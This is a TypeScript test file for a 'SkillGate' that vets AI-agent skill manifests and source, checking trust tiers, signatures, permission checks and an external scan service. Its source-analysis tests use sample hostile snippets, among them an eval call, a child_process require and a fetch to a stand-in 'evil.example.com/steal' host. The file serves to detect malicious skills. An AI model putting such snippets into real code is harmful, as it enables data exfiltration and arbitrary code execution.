/**
 * Skill gate tests — trust-tier decision logic.
 *
 * The SkillGate protects against malicious skill installation. It combines:
 *   - Local static analysis (always-on, free) — blocks critical patterns
 *     outright (eval, child_process, invalid manifest).
 *   - AgentLayers deep scan (optional, paid) — overrides the fallback
 *     decision when available; falls back to local-only otherwise.
 *
 * These tests verify:
 *   - Critical local failures block regardless of AgentLayers.
 *   - AgentLayers BLOCK is honoured.
 *   - Tier is 2 when both signed AND scanned safe, else 1 / 0.
 *   - Unsigned + no AgentLayers still boots at tier 0 if local checks pass.
 *   - Undeclared network usage is caught.
 */

import { describe, it, expect } from 'vitest';
import { SkillGate } from '../skill-gate.js';
import type { AgentLayersClient, SkillScanResult } from '../agentlayers-client.js';
import type { SkillManifest, ToolDefinition } from '@odin/core';

/** Minimal fake client — returns a scripted scan result (or null). */
class FakeAgentLayersClient {
  constructor(private result: SkillScanResult | null = null) {}
  setResult(r: SkillScanResult | null) { this.result = r; }
  async scanSkill(_manifest: SkillManifest): Promise<SkillScanResult | null> {
    return this.result;
  }
  // Other methods aren't exercised by SkillGate
  isAvailable() { return this.result !== null; }
}

const fakeClient = (r: SkillScanResult | null = null) =>
  new FakeAgentLayersClient(r) as unknown as AgentLayersClient;

const validTool: ToolDefinition = {
  name: 'read_file',
  description: 'Read a file',
  parameters: {},
  ring: 0,
  requiredPermissions: ['fs.read'],
};

const validManifest = (overrides: Partial<SkillManifest> = {}): SkillManifest => ({
  name: 'test-skill',
  version: '1.0.0',
  description: 'A test skill',
  author: 'tester',
  tools: [validTool],
  trustTier: 0,
  ...overrides,
});

const scanResult = (overrides: Partial<SkillScanResult> = {}): SkillScanResult => ({
  score: 85,
  decision: 'INSTALL',
  dimensions: {
    permissions: 90, injection: 90, transparency: 80,
    scopeCreep: 85, supplyChain: 80, community: 85,
  },
  warnings: [],
  ...overrides,
});

describe('SkillGate — local-only fallback (no AgentLayers)', () => {
  it('allows a clean unsigned skill at tier 0 (Ring 0 sandbox)', async () => {
    // Design intent: tier 0 is a valid state. Unsigned skills install
    // into Ring 0 with reduced privileges. The signature-present check
    // is informational, not blocking.
    const gate = new SkillGate(fakeClient(null));
    const decision = await gate.verify(validManifest());
    expect(decision.allowed).toBe(true);
    expect(decision.trustTier).toBe(0);
    expect(decision.ring).toBe(0);
    expect(decision.agentLayersScan).toBeNull();
    const sigCheck = decision.localChecks.find(c => c.check === 'signature-present');
    expect(sigCheck?.passed).toBe(true);
    expect(sigCheck?.details).toMatch(/tier 0/i);
  });

  it('promotes signed skills to tier 1 even without AgentLayers', async () => {
    const gate = new SkillGate(fakeClient(null));
    const decision = await gate.verify(validManifest({ signature: 'ed25519:sig' }));
    expect(decision.allowed).toBe(true);
    expect(decision.trustTier).toBe(1);
    expect(decision.ring).toBe(1);
  });

  it('blocks a manifest missing required fields (CRITICAL)', async () => {
    const gate = new SkillGate(fakeClient(null));
    const broken = { ...validManifest(), name: '' };
    const decision = await gate.verify(broken);
    expect(decision.allowed).toBe(false);
    expect(decision.reason).toMatch(/local checks/i);
    expect(decision.trustTier).toBe(0);
  });

  it('fails the permissions check when dangerous perms are requested', async () => {
    const gate = new SkillGate(fakeClient(null));
    const manifest = validManifest({
      tools: [{ ...validTool, requiredPermissions: ['shell.exec'] }],
    });
    const decision = await gate.verify(manifest);
    // Not CRITICAL → doesn't hard-block, but localPassed is false → fallback denies
    expect(decision.allowed).toBe(false);
    const permCheck = decision.localChecks.find(c => c.check === 'permissions-safe');
    expect(permCheck?.passed).toBe(false);
  });
});

describe('SkillGate — source code analysis', () => {
  it('blocks eval() injection pattern as CRITICAL', async () => {
    const gate = new SkillGate(fakeClient(scanResult()));
    const src = `export function run(x) { return eval(x); }`;
    const decision = await gate.verify(validManifest(), src);
    expect(decision.allowed).toBe(false);
    expect(decision.reason).toMatch(/Blocked by local checks/i);
    // Crucially, AgentLayers is NOT consulted once a CRITICAL fails
    expect(decision.agentLayersScan).toBeNull();
  });

  it('blocks child_process requires as CRITICAL', async () => {
    const gate = new SkillGate(fakeClient(null));
    const src = `const cp = require('child_process');`;
    const decision = await gate.verify(validManifest(), src);
    expect(decision.allowed).toBe(false);
  });

  it('blocks non-HTTPS fetch as CRITICAL', async () => {
    const gate = new SkillGate(fakeClient(null));
    const src = `fetch('http://evil.example.com/steal')`;
    const decision = await gate.verify(validManifest(), src);
    expect(decision.allowed).toBe(false);
  });

  it('fails network-declared check when fetch is used but not declared', async () => {
    const gate = new SkillGate(fakeClient(null));
    const src = `fetch('https://api.example.com/data')`;
    const decision = await gate.verify(validManifest(), src);
    const networkCheck = decision.localChecks.find(c => c.check === 'network-declared');
    expect(networkCheck?.passed).toBe(false);
    expect(decision.allowed).toBe(false); // non-CRITICAL but localPassed false → fallback denies
  });

  it('passes network-declared when fetch is used AND network perm declared', async () => {
    const gate = new SkillGate(fakeClient(null));
    const manifest = validManifest({
      tools: [{ ...validTool, requiredPermissions: ['network.fetch'] }],
    });
    const src = `fetch('https://api.example.com/data')`;
    const decision = await gate.verify(manifest, src);
    const networkCheck = decision.localChecks.find(c => c.check === 'network-declared');
    expect(networkCheck?.passed).toBe(true);
  });
});

describe('SkillGate — AgentLayers decisions', () => {
  it('honours AgentLayers BLOCK even if local checks pass', async () => {
    const gate = new SkillGate(fakeClient(scanResult({
      score: 20,
      decision: 'BLOCK',
      warnings: ['malicious pattern matched'],
    })));
    const decision = await gate.verify(validManifest());
    expect(decision.allowed).toBe(false);
    expect(decision.reason).toMatch(/Blocked by AgentLayers/i);
    expect(decision.trustTier).toBe(0);
    expect(decision.agentLayersScan?.decision).toBe('BLOCK');
  });

  it('tier 2 when signed AND AgentLayers score >= 70', async () => {
    const gate = new SkillGate(fakeClient(scanResult({ score: 90 })));
    const decision = await gate.verify(validManifest({ signature: 'ed25519:sig' }));
    expect(decision.allowed).toBe(true);
    expect(decision.trustTier).toBe(2);
    expect(decision.ring).toBe(2);
  });

  it('tier 1 when unsigned but AgentLayers score >= 70', async () => {
    const gate = new SkillGate(fakeClient(scanResult({ score: 75 })));
    const decision = await gate.verify(validManifest());
    expect(decision.allowed).toBe(true);
    expect(decision.trustTier).toBe(1);
  });

  it('tier 0 when AgentLayers score < 70 (even if decision is ASK, not BLOCK)', async () => {
    const gate = new SkillGate(fakeClient(scanResult({ score: 55, decision: 'ASK' })));
    const decision = await gate.verify(validManifest({ signature: 'ed25519:sig' }));
    expect(decision.allowed).toBe(true);
    expect(decision.trustTier).toBe(0);
    expect(decision.reason).toMatch(/approval/i);
  });

  it('ASK decision allows installation but flags user approval in reason', async () => {
    const gate = new SkillGate(fakeClient(scanResult({ score: 60, decision: 'ASK' })));
    const decision = await gate.verify(validManifest());
    expect(decision.allowed).toBe(true);
    expect(decision.reason.toLowerCase()).toContain('approval');
  });
});
